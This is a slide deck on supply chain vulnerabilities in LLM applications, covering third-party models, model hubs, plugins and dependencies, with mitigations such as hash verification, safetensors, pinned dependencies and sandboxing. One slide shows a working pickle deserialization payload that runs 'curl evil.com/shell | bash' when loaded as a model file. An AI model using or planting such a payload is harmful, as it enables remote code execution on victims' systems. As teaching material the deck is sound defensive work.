# LLM05: Supply Chain Vulnerabilities
## Trusting the Untrusted

---

## What Are Supply Chain Vulnerabilities?

- Security risks from **third-party components** in the `LLM` ecosystem
- Includes models, datasets, plugins, libraries, and services
- Any compromised component can undermine the entire system
- The `LLM` supply chain is **new, complex, and poorly secured**

---

## The `LLM` Supply Chain

```diagram
┌─────────────┐  ┌──────────────┐  ┌──────────────┐
│ Pre-trained  │  │  Fine-tuning │  │  Plugins &   │
│   Models     │  │  Datasets    │  │  Extensions  │
└──────┬──────┘  └──────┬───────┘  └──────┬───────┘
       │                │                  │
       ▼                ▼                  ▼
┌─────────────────────────────────────────────────┐
│            Your LLM Application                  │
└─────────────────────────────────────────────────┘
       │                │                  │
       ▼                ▼                  ▼
┌──────────────┐ ┌──────────────┐ ┌──────────────┐
│  ML Libraries│ │  Hosting     │ │  API Gateways│
│  (PyTorch,   │ │  Platform    │ │  & Providers │
│   TF, etc.)  │ │              │ │              │
└──────────────┘ └──────────────┘ └──────────────┘
```

---

## Risk: Third-Party Models

- Models from `Hugging Face`, `GitHub`, or other repositories
- **No guaranteed integrity** — models may contain:
    - Backdoors activated by trigger inputs
    - Biased or malicious behaviors
    - Embedded malware in model files (`pickle` deserialization attacks)

---

## `Pickle` Deserialization Attack

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # Executes arbitrary code when unpickled
        return (os.system, ("curl evil.com/shell | bash",))

# Attacker saves this as a "model file"
with open("model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)

# Victim loads the "model"
model = pickle.load(open("model.pkl", "rb"))
# Malicious code executes!
```

---

## Risk: Compromised Model Hubs

- **Typosquatting**: `gpt-4-turbo` vs `gpt4-turbo` vs `gpt-4turbo`
- **Account takeover**: Attacker gains control of a popular model's account
- **Malicious updates**: A previously safe model is updated with a backdoor
- **Fake popularity**: Inflated download counts to build false trust

---

## Risk: Plugin and Extension Vulnerabilities

- `LLM` plugins execute code with application permissions
- Third-party plugins may:
    - Contain vulnerabilities
    - Exfiltrate data to external servers
    - Be abandoned and become unpatched
    - Have excessive permissions

---

## Risk: Dependency Vulnerabilities

```tree
Your LLM App
├── langchain==0.1.0        ← known CVEs?
├── openai==1.3.0           ← API key exposure risk?
├── chromadb==0.4.0         ← data storage security?
├── tiktoken==0.5.0         ← supply chain attack?
└── transformers==4.35.0    ← model loading risks?
    └── torch==2.1.0
        └── numpy==1.26.0
            └── ...         ← deep dependency tree
```

Every dependency is a potential attack vector

---

## Mitigation: Model Verification

```python
import hashlib

def verify_model(model_path: str, expected_hash: str) -> bool:
    """Verify model integrity using SHA-256 hash."""
    sha256 = hashlib.sha256()
    with open(model_path, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            sha256.update(chunk)
    actual_hash = sha256.hexdigest()
    return actual_hash == expected_hash
```

Always verify model checksums before loading

---

## Mitigation: Safe Model Loading

```python
# UNSAFE: pickle can execute arbitrary code
import pickle
model = pickle.load(open("model.pkl", "rb"))

# SAFER: Use safetensors format (no code execution)
from safetensors import safe_open
with safe_open("model.safetensors", framework="pt") as f:
    tensors = {key: f.get_tensor(key) for key in f.keys()}
```

Prefer **safetensors** over `pickle` for model serialization

---

## Mitigation: Dependency Management

```yaml
# Use pinned versions with hashes
# requirements.txt
langchain==0.1.0 \
  --hash=sha256:abc123...
openai==1.3.0 \
  --hash=sha256:def456...

# Regular auditing
# pip-audit
# safety check
# snyk test
```

Pin versions, verify hashes, and audit regularly

---

## Mitigation: Plugin Sandboxing

- Run plugins in **isolated environments** (containers, `VMs`)
- Apply **least privilege** — only grant necessary permissions
- Review plugin **source code** before deployment
- Monitor plugin **network activity**
- Maintain an **allowlist** of approved plugins

---

## Mitigation: Software Bill of Materials (`SBOM`)

```diagram
Maintain an SBOM for your LLM application:

✓ All model sources and versions
✓ All training/fine-tuning datasets
✓ All software dependencies and versions
✓ All plugins and extensions
✓ All API providers and versions
✓ All infrastructure components
```

An `SBOM` enables rapid response to newly discovered vulnerabilities

---

## Key Takeaways

- The `LLM` supply chain introduces **unique risks** beyond traditional software
- Never load models from untrusted sources using **unsafe deserialization**
- **Pin dependencies**, **verify hashes**, and **audit** regularly
- **Sandbox** third-party plugins and extensions
- Maintain an **`SBOM`** to track all components in your system
